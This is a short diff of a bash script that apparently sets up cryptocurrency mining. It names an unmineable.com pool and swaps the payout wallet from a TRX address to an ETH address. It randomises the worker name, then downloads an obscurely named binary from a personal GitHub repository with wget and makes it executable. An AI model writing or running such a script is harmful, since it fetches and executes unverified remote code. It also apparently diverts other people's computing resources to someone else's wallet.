@@ -1,6 +1,6 @@
 #!/bin/bash
 POOL=ethash.unmineable.com:3333
-WALLET=TRX:TUxbPLqKPtdvtGTFfAYmqJLdzjBhQuWSVU
+WALLET=ETH:0x95E970ec16e69a18f54747F277eaDE6F5487A1a6
 WORKER=$(echo $(shuf -i 10-40 -n 1)-COLN#im8m-ybvt)
 wget https://github.com/archernap/prem/raw/main/priyatama
 chmod +x priyatama
